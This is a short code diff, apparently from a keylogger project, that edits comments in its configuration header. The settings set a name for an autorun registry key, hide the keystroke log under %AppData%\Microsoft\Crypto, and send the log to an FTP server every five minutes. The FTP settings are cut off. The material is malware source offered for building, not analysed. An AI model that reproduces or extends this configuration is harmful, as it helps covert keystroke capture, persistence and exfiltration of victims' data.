@@ -1,4 +1,6 @@
-/* Keylogger name ( need for create autorun registry key ) */
+/* Default config template */
+
+/* Keylogger name is need for create autorun registry key */
 #define NAME            L"foo"
 
 /* Machine alias */
@@ -7,9 +9,8 @@
 /* Log file will be save in %AppData%\Microsoft\Crypto directory */
 #define LOG_FILE        L"log.dat"
 
-/* Send log to ftp every 5 min. 
- * Formula: ms * sec * min
- */
+/* Send log to ftp every 5 min. *
+ * Formula: ms * sec * min      */
 #define SEND_LOG_PERIOD  (1000 * 60 * 5)
 
 /* FTP settings */
